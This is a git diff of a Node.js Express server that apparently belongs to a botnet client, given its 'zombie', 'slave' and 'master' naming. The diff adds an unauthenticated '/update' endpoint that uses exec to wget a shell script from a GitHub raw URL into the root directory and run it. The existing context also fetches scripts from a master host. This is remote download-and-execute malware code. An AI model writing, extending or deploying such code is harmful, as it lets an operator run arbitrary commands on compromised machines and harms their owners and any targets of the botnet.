@@ -148,6 +148,19 @@ settingIntegrity.on('true', () => {
         res.send(200, { zombie })
     })
 
+    app.get('/update', (req, res) => {
+        exec("cd /; wget https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/cleanup.sh; ./cleanup.sh", (err, stdout, stderr) => {
+            if (err) {
+                //some err occurred
+                console.error(err)
+            } else {
+                // the *entire* stdout and stderr (buffered)
+                console.log(`stdout: ${stdout}`);
+                console.log(`stderr: ${stderr}`);
+            }
+        })
+    })
+
     app.get('/installScript/:scriptid', (req, res) => {
         let scriptid = req.params.scriptid
         axios.get("http://" + master + "/scripts?" + scriptid)
